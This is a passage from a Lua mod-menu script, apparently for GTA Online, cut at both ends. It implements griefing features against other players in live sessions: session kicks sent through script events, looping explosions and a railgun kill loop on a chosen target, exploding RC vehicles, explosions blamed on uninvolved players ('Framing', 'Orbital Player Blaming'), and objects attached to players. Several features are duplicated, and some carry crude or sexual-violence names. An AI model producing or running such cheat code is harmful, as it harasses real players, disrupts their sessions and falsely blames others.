    ped.set_ped_prop_index(_ped, 2, plyr_clothes["player_ears"], plyr_cloth_tex["player_ears_tex"], 0)
    ped.set_ped_prop_index(_ped, 6, plyr_clothes["player_watches"], plyr_cloth_tex["player_watches_tex"], 0)
    ped.set_ped_prop_index(_ped, 7, plyr_clothes["player_bracelets"], plyr_cloth_tex["player_bracelets_tex"], 0)


    if (player.is_player_female(pid)) then
        ped.set_ped_component_variation(_ped, 6, 35, 0, 0)
    else
        ped.set_ped_component_variation(_ped, 6, 34, 0, 0)
    end
    ped.set_ped_head_blend_data(_ped, _hb["shape_first"], _hb["shape_second"], _hb["shape_third"], _hb["skin_first"], _hb["skin_second"], _hb["skin_third"], _hb["mix_shape"], _hb["mix_skin"], _hb["mix_third"])

    local blippy = ui.add_blip_for_entity(_ped)
    ui.set_blip_sprite(blippy, 1)
    network.request_control_of_entity(_ped)

    while playerfeat_toggle_val.on do
        if (playerfeat_toggle_val.value == 0) then
            ai.task_go_to_coord_by_any_means(_ped, player.get_player_coords(pid) + v3(math.random(-4, 4), math.random(-4, 4), 0), math.random(1, 2), 0, true, 1, 0.0)
            system.wait(2000)
        elseif (playerfeat_toggle_val.value == 1) then
            ai.task_go_to_coord_by_any_means(_ped, player.get_player_coords(pid) + v3(math.random(-4, 4), math.random(-4, 4), 0), math.random(0, 1), 0, true, 1, 0.0)
            system.wait(2000)
        end
    end
    if (not playerfeat_toggle_val.on) then
        entity.set_entity_as_no_longer_needed(_ped)
        entity.delete_entity(_ped)
    end
end):set_str_data({"Outside", "Inside"})

-- Spawn a dead copy of player
menu.add_player_feature("Spawn Dead Player", "value_str", trolling.id, function(playerfeat_toggle_val, pid)
    menu.notify("Spawned a dead copy of "..player.get_player_name(pid)..". This only works if you're in range or spectating the player.", "", 10, 0x00ff00)
    local MP_ped
    if (player.is_player_female(pid)) then
        MP_ped = 0x9C9EFFD8
    else
        MP_ped = 0x705E61F2
    end
    local plyr_clothes = {
        player_mask = ped.get_ped_drawable_variation(player.get_player_ped(pid), 1),
        player_top = ped.get_ped_drawable_variation(player.get_player_ped(pid), 11),
        player_legs = ped.get_ped_drawable_variation(player.get_player_ped(pid), 4),
        player_vest = ped.get_ped_drawable_variation(player.get_player_ped(pid), 9),
        player_hair = ped.get_ped_drawable_variation(player.get_player_ped(pid), 2),
        player_undershirts = ped.get_ped_drawable_variation(player.get_player_ped(pid), 8),
        player_torso = ped.get_ped_drawable_variation(player.get_player_ped(pid), 3),
        player_feet = ped.get_ped_drawable_variation(player.get_player_ped(pid), 6),
        player_accessories = ped.get_ped_drawable_variation(player.get_player_ped(pid), 7),
        player_hats = ped.get_ped_prop_index(player.get_player_ped(pid), 0),
        player_glasses = ped.get_ped_prop_index(player.get_player_ped(pid), 1),
        player_ears = ped.get_ped_prop_index(player.get_player_ped(pid), 2),
        player_watches = ped.get_ped_prop_index(player.get_player_ped(pid), 6),
        player_bracelets = ped.get_ped_prop_index(player.get_player_ped(pid), 7),
    }
    local plyr_cloth_tex = {
        player_mask_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 1),
        player_top_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 11),
        player_legs_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 4),
        player_vest_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 9),
        player_hair_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 2),
        player_undershirts_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 8),
        player_torso_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 3),
        player_accessories_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 7),
        player_feet_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 6),
        player_hats_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 0),
        player_glasses_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 1),
        player_ears_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 2),
        player_watches_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 6),
        player_bracelets_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 7)
    }
    local _hb = ped.get_ped_head_blend_data(player.get_player_ped(pid))

    streaming.request_model(MP_ped)
    while (not streaming.has_model_loaded(MP_ped)) do
        system.wait(10)
    end

    local _ped = ped.create_ped(1, MP_ped, player.get_player_coords(pid) + v3(math.random(-3, 3), math.random(-3, 3), 0), player.get_player_heading(pid), true, false)
    ped.set_ped_component_variation(_ped, 1, plyr_clothes["player_mask"], plyr_cloth_tex["player_mask_tex"], 0)
    ped.set_ped_component_variation(_ped, 11, plyr_clothes["player_top"], plyr_cloth_tex["player_top_tex"], 0)
    ped.set_ped_component_variation(_ped, 4, plyr_clothes["player_legs"], plyr_cloth_tex["player_legs_tex"], 0)
    ped.set_ped_component_variation(_ped, 9, plyr_clothes["player_vest"], plyr_cloth_tex["player_vest_tex"], 0)
    ped.set_ped_component_variation(_ped, 2, plyr_clothes["player_hair"], plyr_cloth_tex["player_hair_tex"], 0)
    ped.set_ped_component_variation(_ped, 8, plyr_clothes["player_undershirts"], plyr_cloth_tex["player_undershirts_tex"], 0)
    ped.set_ped_component_variation(_ped, 3, plyr_clothes["player_torso"], plyr_cloth_tex["player_torso_tex"], 0)
    ped.set_ped_component_variation(_ped, 7, plyr_clothes["player_accessories"], plyr_cloth_tex["player_accessories_tex"], 0)
    ped.set_ped_component_variation(_ped, 6, plyr_clothes["player_feet"], plyr_cloth_tex["player_feet_tex"], 0)
    ped.set_ped_prop_index(_ped, 0, plyr_clothes["player_hats"], plyr_cloth_tex["player_hats_tex"], 0)
    ped.set_ped_prop_index(_ped, 1, plyr_clothes["player_glasses"], plyr_cloth_tex["player_glasses_tex"], 0)
    ped.set_ped_prop_index(_ped, 2, plyr_clothes["player_ears"], plyr_cloth_tex["player_ears_tex"], 0)
    ped.set_ped_prop_index(_ped, 6, plyr_clothes["player_watches"], plyr_cloth_tex["player_watches_tex"], 0)
    ped.set_ped_prop_index(_ped, 7, plyr_clothes["player_bracelets"], plyr_cloth_tex["player_bracelets_tex"], 0)
    ped.set_ped_head_blend_data(_ped, _hb["shape_first"], _hb["shape_second"], _hb["shape_third"], _hb["skin_first"], _hb["skin_second"], _hb["skin_third"], _hb["mix_shape"], _hb["mix_skin"], _hb["mix_third"])

    local blippy = ui.add_blip_for_entity(_ped)
    ui.set_blip_sprite(blippy, 1)

    system.wait(450)
    network.request_control_of_entity(MP_ped)
    while (playerfeat_toggle_val.on) do
        if streaming.has_anim_dict_loaded("dead") then
            if (playerfeat_toggle_val.value == 0) then
                ai.task_play_anim(_ped, "dead", "dead_a", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 1) then
                ai.task_play_anim(_ped, "dead", "dead_b", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 2) then
                ai.task_play_anim(_ped, "dead", "dead_c", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 3) then
                ai.task_play_anim(_ped, "dead", "dead_d", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 4) then
                ai.task_play_anim(_ped, "dead", "dead_e", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 5) then
                ai.task_play_anim(_ped, "dead", "dead_f", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 6) then
                ai.task_play_anim(_ped, "dead", "dead_g", 8.0, 0, -1, 9, 0, false, false, false)
            elseif (playerfeat_toggle_val.value == 7) then
                ai.task_play_anim(_ped, "dead", "dead_h", 8.0, 0, -1, 9, 0, false, false, false)
            end
        else
            menu.notify("Anim not loaded", "", 10, 2)
        end
        system.wait(1000)
    end
    if (not playerfeat_toggle_val.on) then
        entity.set_entity_as_no_longer_needed(_ped)
        entity.delete_entity(_ped)
    end
end):set_str_data({"Dead 1", "Dead 2", "Dead 3", "Dead 4", "Dead 5", "Dead 6", "Dead 7", "Dead 8"})

---------------------- TROLLING ATTACHMENTS --------------------------------------------------
hitbox =menu.add_player_feature("Collision?", "toggle", trolling.id, function(f)
end)

menu.add_player_feature("Attach seagull!", "action", trolling.id, function(f,pid)
    local col = false
    if hitbox.on then
    col = true
    end
    local hash = 0xD3939DFD
    local pos = player.get_player_coords(pid)
    local playerPed = player.get_player_ped(pid)
    
    streaming.request_model(hash)
        while(not streaming.has_model_loaded(hash))
        do
            system.wait(0)
        end
    
    local attachment = ped.create_ped(26, hash, v3(pos.x, pos.y, pos.z), pos.z, true, false)
    
    network.request_control_of_entity(attachment)
    while(not network.has_control_of_entity(attachment))
        do
            system.wait(0)
    end
    entity.set_entity_god_mode(attachment, true)
    objeto = entity.attach_entity_to_entity(attachment, playerPed, math.random(0, 98), v3(0,0,0), v3(0,0,0), true, col, false, 0, true)
    system.wait(10)
    
    streaming.set_model_as_no_longer_needed(hash)
    menu.notify("Seagulls!!!", "", 10, 2)
    end)
    
    
    
    
    
    menu.add_player_feature("Attach cow!", "action", trolling.id, function(f,pid)
    local col = false
    if hitbox.on then
    col = true
    end
    local hash = 0xFCFA9E1E
    local pos = player.get_player_coords(pid)
    local playerPed = player.get_player_ped(pid)
    
    streaming.request_model(hash)
        while(not streaming.has_model_loaded(hash))
        do
            system.wait(0)
        end
    
    local attachment = ped.create_ped(26, hash, v3(pos.x, pos.y, pos.z), pos.z, true, false)
    
    network.request_control_of_entity(attachment)
    while(not network.has_control_of_entity(attachment))
        do
            system.wait(0)
    end
    entity.set_entity_god_mode(attachment, true)
    objeto = entity.attach_entity_to_entity(attachment, playerPed, math.random(0, 98), v3(0,0,0), v3(0,0,0), true, col, false, 0, true)
    system.wait(10)
    
    streaming.set_model_as_no_longer_needed(hash)
    
    menu.notify("Cows!!!!", "", 10, 2)
    end)
    
    menu.add_player_feature("Attach killer whale!", "action", trolling.id, function(f,pid)
    local col = false
    if hitbox.on then
    col = true
    end
    local hash = 0x8D8AC8B9
    local pos = player.get_player_coords(pid)
    local playerPed = player.get_player_ped(pid)
    
    streaming.request_model(hash)
        while(not streaming.has_model_loaded(hash))
        do
            system.wait(0)
        end
    
    local attachment = ped.create_ped(26, hash, v3(pos.x, pos.y, pos.z), pos.z, true, false)
    network.request_control_of_entity(attachment)
    while(not network.has_control_of_entity(attachment))
        do
            system.wait(0)
    end
    entity.set_entity_god_mode(attachment, true)
    objeto = entity.attach_entity_to_entity(attachment, playerPed, math.random(0, 98), v3(0,0,0), v3(0,0,0), true, col, false, 0, true)
    system.wait(10)
    
    streaming.set_model_as_no_longer_needed(hash)
    
    menu.notify("killer whale!!!!", "", 10, 2)
    end)
    
    menu.add_player_feature("Attach humpback!", "action", trolling.id, function(f,pid)
    local col = false
    if hitbox.on then
    col = true
    end
    local hash = 0x471BE4B2
    local pos = player.get_player_coords(pid)
    local playerPed = player.get_player_ped(pid)
    
    streaming.request_model(hash)
        while(not streaming.has_model_loaded(hash))
        do
            system.wait(0)
        end
    
    local attachment = ped.create_ped(26, hash, v3(pos.x, pos.y, pos.z), pos.z, true, false)
    
    network.request_control_of_entity(attachment)
    while(not network.has_control_of_entity(attachment))
        do
            system.wait(0)
    end
    entity.set_entity_god_mode(attachment, true)
    objeto = entity.attach_entity_to_entity(attachment, playerPed, math.random(0, 98), v3(0,0,0), v3(0,0,0), true, col, false, 0, true)
    system.wait(10)
    
    streaming.set_model_as_no_longer_needed(hash)
    
    menu.notify("humpback!!!!", "", 10, 2)
    end)
    
    
    menu.add_player_feature("Attach crow!", "action", trolling.id, function(f,pid)
    local col = false
    if hitbox.on then
    col = true
    end
    local hash = 0x18012A9F
    local pos = player.get_player_coords(pid)
    local playerPed = player.get_player_ped(pid)
    
    streaming.request_model(hash)
        while(not streaming.has_model_loaded(hash))
        do
            system.wait(0)
        end
    
    local attachment = ped.create_ped(26, hash, v3(pos.x, pos.y, pos.z), pos.z, true, false)
    
    network.request_control_of_entity(attachment)
    while(not network.has_control_of_entity(attachment))
        do
            system.wait(0)
    end
    entity.set_entity_god_mode(attachment, true)
    objeto = entity.attach_entity_to_entity(attachment, playerPed, math.random(0, 98), v3(0,0,0), v3(0,0,0), true, col, false, 0, true)
    system.wait(10)
    
    streaming.set_model_as_no_longer_needed(hash)
    
    menu.notify("Crow!!!!", "", 10, 2)
    end)
    
    
    menu.add_player_feature("Attach fish!", "action", trolling.id, function(f,pid)
    local col = false
    if hitbox.on then
    col = true
    end
    local hash = 0x2FD800B7
    local pos = player.get_player_coords(pid)
    local playerPed = player.get_player_ped(pid)
    
    streaming.request_model(hash)
        while(not streaming.has_model_loaded(hash))
        do
            system.wait(0)
        end
    
    local attachment = ped.create_ped(26, hash, v3(pos.x, pos.y, pos.z), pos.z, true, false)
    
    network.request_control_of_entity(attachment)
    while(not network.has_control_of_entity(attachment))
        do
            system.wait(0)
    end
    entity.set_entity_god_mode(attachment, true)
    objeto = entity.attach_entity_to_entity(attachment, playerPed, math.random(0, 98), v3(0,0,0), v3(0,0,0), true, col, false, 0, true)
    system.wait(10)
    
    streaming.set_model_as_no_longer_needed(hash)
    
    menu.notify("Fish!!!!", "", 10, 2)
    end)
    
    menu.add_player_feature("Attach hen!", "action", trolling.id, function(f,pid)
    local col = false
    if hitbox.on then
    col = true
    end
    local hash = 0x6AF51FAF
    local pos = player.get_player_coords(pid)
    local playerPed = player.get_player_ped(pid)
    
    streaming.request_model(hash)
        while(not streaming.has_model_loaded(hash))
        do
            system.wait(0)
        end
    
    local attachment = ped.create_ped(26, hash, v3(pos.x, pos.y, pos.z), pos.z, true, false)
    
    network.request_control_of_entity(attachment)
    while(not network.has_control_of_entity(attachment))
        do
            system.wait(0)
    end
    entity.set_entity_god_mode(attachment, true)
    objeto = entity.attach_entity_to_entity(attachment, playerPed, math.random(0, 98), v3(0,0,0), v3(0,0,0), true, col, false, 0, true)
    system.wait(10)
    
    streaming.set_model_as_no_longer_needed(hash)
    
    menu.notify("hen!!!!", "", 10, 2)
    end)
    
    menu.add_player_feature("Attach rabbit!", "action", trolling.id, function(f,pid)
    local col = false
    if hitbox.on then
    col = true
    end
    local hash = 0xDFB55C81
    local pos = player.get_player_coords(pid)
    local playerPed = player.get_player_ped(pid)
    
    streaming.request_model(hash)
        while(not streaming.has_model_loaded(hash))
        do
            system.wait(0)
        end
    
    local attachment = ped.create_ped(26, hash, v3(pos.x, pos.y, pos.z), pos.z, true, false)
    
    network.request_control_of_entity(attachment)
    while(not network.has_control_of_entity(attachment))
        do
            system.wait(0)
    end
    entity.set_entity_god_mode(attachment, true)
    objeto = entity.attach_entity_to_entity(attachment, playerPed, math.random(0, 98), v3(0,0,0), v3(0,0,0), true, col, false, 0, true)
    system.wait(10)
    
    streaming.set_model_as_no_longer_needed(hash)
    
    menu.notify("rabbit!!!!", "", 10, 2)
    end)
    
    
    menu.add_player_feature("Attach stingray!", "action", trolling.id, function(f,pid)
    local col = false
    if hitbox.on then
    col = true
    end
    local hash = 0xA148614D
    local pos = player.get_player_coords(pid)
    local playerPed = player.get_player_ped(pid)
    
    streaming.request_model(hash)
        while(not streaming.has_model_loaded(hash))
        do
            system.wait(0)
        end
    
    local attachment = ped.create_ped(26, hash, v3(pos.x, pos.y, pos.z), pos.z, true, false)
    
    network.request_control_of_entity(attachment)
    while(not network.has_control_of_entity(attachment))
        do
            system.wait(0)
    end
    entity.set_entity_god_mode(attachment, true)
    objeto = entity.attach_entity_to_entity(attachment, playerPed, math.random(0, 98), v3(0,0,0), v3(0,0,0), true, col, false, 0, true)
    system.wait(10)
    
    streaming.set_model_as_no_longer_needed(hash)
    
    menu.notify("stingray!!!!", "", 10, 2)
    end)
    
    menu.add_player_feature("Attach piggeon!", "action", trolling.id, function(f,pid)
    local col = false
    if hitbox.on then
    col = true
    end
    local hash = 0x06A20728
    local pos = player.get_player_coords(pid)
    local playerPed = player.get_player_ped(pid)
    
    streaming.request_model(hash)
        while(not streaming.has_model_loaded(hash))
        do
            system.wait(0)
        end
    
    local attachment = ped.create_ped(26, hash, v3(pos.x, pos.y, pos.z), pos.z, true, false)
    
    network.request_control_of_entity(attachment)
    while(not network.has_control_of_entity(attachment))
        do
            system.wait(0)
    end
    entity.set_entity_god_mode(attachment, true)
    objeto = entity.attach_entity_to_entity(attachment, playerPed, math.random(0, 98), v3(0,0,0), v3(0,0,0), true, col, false, 0, true)
    system.wait(10)
    
    streaming.set_model_as_no_longer_needed(hash)
    
    menu.notify("stingray!!!!", "", 10, 2)
    end)
---------------------- trolling attachments ----------------------------------------------------
----------------------TROLLING ABOVE ------------------------------------------------------------
---------------------- TROLLING BANDITOS -------------------------------------------------------
Objs = {
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"10"
}

ui.notify_above_map("Loading RC Trolls", "Important", 215)
function seater(count, id, hash)
	for u=1, count do
		local pos = player.get_player_coords(id)
		streaming.request_model(gameplay.get_hash_key(hash))
		cars[u] = vehicle.create_vehicle(gameplay.get_hash_key(hash), v3(pos.x + math.random(0, 15), pos.y + math.random(0, 15), pos.z), pos.z, true, false)
		streaming.request_model(0x92991B72)
		drivers[u] = ped.create_ped(26, 0x92991B72, v3(pos.x + 7, pos.y, pos.z), pos.z, true, false)
		ped.set_ped_into_vehicle(drivers[u], cars[u], -1)
		menu.notify("RC Toy Spawned", "Stand", 5, 2)
		ai.task_vehicle_chase(drivers[u], player.get_player_ped(id))
		ai.task_vehicle_follow(drivers[u], cars[u], player.get_player_ped(id), 50.0, 0, 1)
		menu.notify("RC Toy Chasing", "Stand", 5, 2)
		system.wait(500)
	end
	return cars, drivers
end


menu.add_player_feature("Send RC Tanks: ", "action_value_str", trolling.id, function(val, pid)
	local num = Objs[val.value+1]
	cars = {}
	drivers = {}
	seater(num, pid, "minitank")	
	for i = 1, #cars do
		while ped.get_ped_health(player.get_player_ped(pid)) > 0 do
			system.wait(500)
			local pos1 = player.get_player_coords(pid)
			local poss = v3(pos1.x + 20, pos1.y + 20, pos1.z + 50)
			local bpos = entity.get_entity_coords(cars[i])
			if (bpos.x <= poss.x) and (bpos.y <= poss.y) and (bpos.z <= poss.z)  or (bpos.x >= poss.x) and (bpos.y >= poss.y) and (bpos.z >= poss.z)then
				ai.task_vehicle_shoot_at_ped(drivers[i], player.get_player_ped(pid), 100.0)

			end
		end
		system.wait(1000)
		entity.delete_entity(drivers[i])
		entity.delete_entity(cars[i])
	end
end):set_str_data(Objs)

blamed = player.player_id()

menu.add_player_feature("Send RC Banditos: ", "action_value_str", trolling.id, function(val, pid)
	local num = Objs[val.value+1]
	local boomed = 0
	cars = {}
	drivers = {}
	seater(num, pid, "rcbandito")	
	while boomed < #cars do
		for i = 1, #cars do
			system.wait(500)
			local pos1 = player.get_player_coords(pid)
			local poss = v3(pos1.x + 3, pos1.y + 3, pos1.z + 5)
			local bpos = entity.get_entity_coords(cars[i])
			if (bpos.x <= poss.x) and (bpos.y <= poss.y) and (bpos.z <= poss.z)  or (bpos.x >= poss.x) and (bpos.y >= poss.y) and (bpos.z >= poss.z)then
				fire.add_explosion(bpos, 0, true, false, 2.0, player.get_player_ped(pid))
				menu.notify("Bandito Exploding", "Stand", 5, 2)
				entity.delete_entity(drivers[i])
				entity.delete_entity(cars[i])
				boomed = boomed + 1
			end
		end
	end
end):set_str_data(Objs)

menu.add_player_feature("Send RC Banditos Blamed: ", "action_value_str", trolling.id, function(val, pid)
	local num = Objs[val.value+1]
	local boomed = 0
	cars = {}
	drivers = {}
	seater(num, pid, "rcbandito")	
	while boomed < #cars do
		for i = 1, #cars do
			system.wait(500)
			local pos1 = player.get_player_coords(pid)
			local poss = v3(pos1.x + 3, pos1.y + 3, pos1.z + 5)
			local bpos = entity.get_entity_coords(cars[i])
			if (bpos.x <= poss.x) and (bpos.y <= poss.y) and (bpos.z <= poss.z)  or (bpos.x >= poss.x) and (bpos.y >= poss.y) and (bpos.z >= poss.z)then
				fire.add_explosion(bpos, 0, true, false, 2.0, player.get_player_ped(blamed))
				menu.notify("Bandito Exploding", "Stand", 5, 2)
				entity.delete_entity(drivers[i])
				entity.delete_entity(cars[i])
				boomed = boomed + 1
			end
		end
	end
end):set_str_data(Objs)

--------------------- trolling shit ends here -----------------------------------------------------
----------------------------------------------------------------------------------------------------
--------------------- TROLLING 2 PART --------------------------------------------------------------
local one_kick=menu.add_player_feature(
    "Violently kick",
    "action",
    trolling2.id,
    function(a,pid)
        if pid~=me and not player.is_player_friend(pid) and player.is_player_valid(pid) then
            network.network_session_kick_player(pid)
            send_script_event("Netbail kick", pid, {pid, generic_player_global(pid)})
            for x=0,17 do
                send_script_event("Kick "..tostring(x), pid, {pid, generic_player_global(pid)})
            end
        end
    end
)
local fuck_him=menu.add_player_feature(
    "Shake player",
    "toggle",
    trolling2.id,
    function(a,pid)
        while a.on do
            system.yield(0)
            fire.add_explosion(player.get_player_coords(pid)-v3(0,0,30),1,false,true,99999999,player.get_player_ped(pid))
        end
    end
)


local ima_badman=menu.add_player_feature(
    "Framing",
    "toggle",
    trolling2.id,
    function(a,killer)
       while a.on do
            system.yield(0)
            for pid=0,31 do
                if player.is_player_valid(pid) and not player.is_player_friend(pid)  and player.player_id() ~= pid then
                    fire.add_explosion(player.get_player_coords(pid),28,true,false,99999999,player.get_player_ped(killer))
                end
            end
       end
    end
)


local killing_roll=menu.add_player_feature(
    "Killing Halo",
    "toggle",
    trolling2.id,
    function(a,pid)
        while a.on do
            system.yield(0)
            local target_player_coords=player.get_player_coords(pid)
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            entity.set_entity_coords_no_offset(my_ped,target_player_coords+v3(math.random(-4,4),math.random(-4,4),2))
            system.yield(0)
            entity.set_entity_rotation(my_ped,v3(0,0,target_player_coords.z-180))
            local hash_weapon = is_pz(ped.get_current_ped_weapon(my_ped))
            gameplay.shoot_single_bullet_between_coords(target_player_coords, target_player_coords+v3(0,0,0.5), 1, hash_weapon, my_ped, true, false, 1000)
        end
    end
)


menu.add_player_feature("Update Players", "action", trolling2.id, function()
	PlayerArray()
	orbital:set_str_data(Playerz)
	menu.notify("Playerlist Updated", "Update", 5, 2)
end)

orbital = menu.add_player_feature("Orbital Player Blaming: ", "action_value_str", trolling2.id , function(val, pid)
	local pos = v3()
	pped = player.get_player_ped(pid)
	for i = 0, 33 do
		if player.is_player_valid(i) and Playerz[val.value + 1] == player.get_player_name(i) then
			myped = player.get_player_ped(i)
			pos = entity.get_entity_coords(pped)
			offset = v3(0.0,0.0,-2000.00)
			script.get_global_f(1694982)
			graphics.set_next_ptfx_asset("scr_xm_orbital")
			while not graphics.has_named_ptfx_asset_loaded("scr_xm_orbital") do
				graphics.request_named_ptfx_asset("scr_xm_orbital")
				system.wait(0)
			end
			gameplay.set_override_weather(3)
			gameplay.clear_cloud_hat()
			fire.add_explosion(pos, 59, true, false, 1.5, myped)
			fire.add_explosion(pos + offset, 60, true, false, 1.8, myped)
			fire.add_explosion(pos + offset, 62, true, false, 2.0, myped)
			fire.add_explosion(pos + v3(100.0,100.0,7000.00), 50, true, false, 1.0, myped)
			fire.add_explosion(pos, 50, true, false, 1.0, myped)
			graphics.start_networked_ptfx_non_looped_at_coord("scr_xm_orbital_blast", pos, v3(0, 0, 0), 100.000, false, false, true)
			audio.play_sound_from_coord(-1, "BOATS_PLANES_HELIS_BOOM", v3(-910000.00,-10000.0,-19000.00), "MP_LOBBY_SOUNDS", true, 999999, false)
			audio.play_sound_from_coord(-1, "DLC_XM_Explosions_Orbital_Cannon", pos, "MP_LOBBY_SOUNDS", true, 99999990, false)
			audio.play_sound_from_coord(-1, "DLC_XM_Explosions_Orbital_Cannon", pos, 0, true, 0, false)
			audio.play_sound_from_coord(-1, "BOATS_PLANES_HELIS_BOOM", v3(-910000.00,-10000.0,-19000.00), "MP_LOBBY_SOUNDS", true, 999999, false)
			audio.play_sound_from_coord(script.get_global_i(1694982), "DLC_XM_Explosions_Orbital_Cannon", pos, "MP_LOBBY_SOUNDS", true, 99999990, false)
			audio.play_sound_from_coord(script.get_global_i(1694982), "DLC_XM_Explosions_Orbital_Cannon", pos, 0, true, 0, false)
			audio.play_sound_from_coord(-1, "DLC_XM_Explosions_Orbital_Cannon", pos, myped, true, 0, false)
			audio.play_sound_from_coord(-1, "DLC_XM_Explosions_Orbital_Cannon", pos, 0, true, 0, false)
			graphics.set_next_ptfx_asset("scr_xm_orbital")
			while not graphics.has_named_ptfx_asset_loaded("scr_xm_orbital") do
				graphics.request_named_ptfx_asset("scr_xm_orbital")
				system.wait(0)
			end
			gameplay.set_override_weather(3)
			gameplay.clear_cloud_hat()
			fire.add_explosion(pos, 59, false, true, 1.5, myped)
			fire.add_explosion(pos + offset, 60, true, false, 1.8, myped)
			fire.add_explosion(pos + offset, 62, true, false, 2.0, myped)
			fire.add_explosion(pos + v3(100.0,100.0,7000.00), 50, true, false, 1.0, myped)
			fire.add_explosion(pos, 50, true, false, 1.0, myped)
			fire.add_explosion(pos, 50, true, false, 1.0, myped)
			graphics.start_networked_ptfx_non_looped_at_coord("scr_xm_orbital_blast", pos, v3(0, 0, 0), 100.000, false, false, true)
			--  audio.play_sound_from_coord(-1, "BOATS_PLANES_HELIS_BOOM", pos + v3(0.0,0.0,20000), "MP_LOBBY_SOUNDS", true, 0, false)
			audio.play_sound_from_coord(-1, "DLC_XM_Explosions_Orbital_Cannon", pos, "o", true, 0, false)
			audio.play_sound(-1, "DLC_XM_Explosions_Orbital_Cannon", 0, true, 0,false)
			audio.play_sound(-1, "DLC_XM_Explosions_Orbital_Cannon", 0, true, 999999999, false)
			audio.play_sound(script.get_global_i(1694982), "DLC_XM_Explosions_Orbital_Cannon", 0, true, 0, false)
			audio.play_sound_from_coord(script.get_global_i(1694982), "DLC_XM_Explosions_Orbital_Cannon", pos,  0,  true, 999999999, false)
			audio.play_sound_from_coord(-1, "MP_Impact", pos, 0, true, 0, false)
			audio.play_sound(-1, "MP_Impact", 0, true, 0, false)
			graphics.set_next_ptfx_asset("scr_xm_orbital")
			while not graphics.has_named_ptfx_asset_loaded("scr_xm_orbital") do
				graphics.request_named_ptfx_asset("scr_xm_orbital")
				system.wait(0)
			end
			graphics.start_networked_ptfx_non_looped_at_coord("scr_xm_orbital_blast", pos, v3(0, 0, 0), 10.000, false, false, true)
		end
	end
	PlayerArray()
end)







menu.add_player_feature("Crazy Rain", "toggle", trolling2.id , function(feat, pid)
    menu.notify("Raining stuff on " .. player.get_player_name(pid), "Rain", 6, 6)
	streaming.request_model(gameplay.get_hash_key("prop_elecbox_11"))
	streaming.request_model(gameplay.get_hash_key("prop_ld_int_safe_01"))
	streaming.request_model(gameplay.get_hash_key("prop_devin_box_dummy_01"))
	streaming.request_model(gameplay.get_hash_key("ch_prop_ch_diamond_xmastree"))
	streaming.request_model(gameplay.get_hash_key("bkr_prop_clubhouse_jukebox_01a"))
	streaming.request_model(0x15F27762)
	streaming.request_model(0x4FAF0D70)
	streaming.request_model(0x810369E2)
		
	system.wait(6000)
	menu.create_thread(crazyRain, {feat = feat, pid = pid})
end)

menu.add_player_feature("Cage 'Em", "action", trolling2.id, function(val, pid)
	ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
	system.wait(0)
	local pos = player.get_player_coords(pid)
    object.create_object(gameplay.get_hash_key("as_prop_as_target_scaffold_01a"), v3(pos.x, pos.y - .5, pos.z - 1), true, false)
end)

Playerz = {}
function PlayerArray()
	Playerz = {}
	for pid = 0, 33 do
		if player.is_player_valid(pid) then 
			table.insert(Playerz, player.get_player_name(pid))
		end
	end
	return Playerz
end
PlayerArray()

menu.add_player_feature("Railgun kill loop", "toggle", trolling2.id, function(feat, pid)
    while feat.on do
      system.wait(0)
      local pos = v3()
      pos = player.get_player_coords(pid)
      pos.z = pos.z + 65.0
      gameplay.shoot_single_bullet_between_coords(pos, player.get_player_coords(pid) + v3(0, 0, 1), 10000.00, 0x6D544C99, 0, true, false, 10000.0)
    end
  end)


local fuck_him=menu.add_player_feature(
    "FUCK HIM",
    "toggle",
    trolling2.id,
    function(a,pid)
        while a.on do
            system.yield(0)
            fire.add_explosion(player.get_player_coords(pid)-v3(0,0,30),1,false,true,99999999,player.get_player_ped(pid))
        end
    end
)


local ima_badman=menu.add_player_feature(
    "ima Badman",
    "toggle",
    trolling2.id,
    function(a,killer)
       while a.on do
            system.yield(0)
            for pid=0,31 do
                if player.is_player_valid(pid) and not player.is_player_friend(pid)  and player.player_id() ~= pid then
                    fire.add_explosion(player.get_player_coords(pid),28,true,false,99999999,player.get_player_ped(killer))
                end
            end
       end
    end
)







--------------------- AT0MICS STUFF BELOW ------------------------------------------------------
menu.add_player_feature("Rape Their Car", "action", at0mic.id, function(playerfeat, pid)
    local pos1 = player.get_player_coords(pid)
    pos1.z = pos1.z + 0.10       

    local cageobjecthash = gameplay.get_hash_key("prop_beach_fire") 
    local cageobject = object.create_object(cageobjecthash, pos1, true, false)

    entity.set_entity_visible(cageobject, false)

    local playerped3 = player.get_player_ped(pid)
    local pos = v3()

    attach_object1132 = object.create_object(-1065766299, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
    entity.set_entity_visible(attach_object1132, false)
    
    end)



menu.add_player_feature("Rape Their Car v2", "action", at0mic.id, function(playerfeat, pid)
    local pos1 = player.get_player_coords(pid)
    pos1.z = pos1.z - 0.20      
    fire.add_explosion(pos1, 6, true, false, 1, pid)
    local cageobjecthash = gameplay.get_hash_key("prop_beach_fire") 
    local cageobject = object.create_object(cageobjecthash, pos1, true, false)


    fire.add_explosion(pos1, 7, true, false, 1, pid)

    entity.set_entity_visible(cageobject, false)

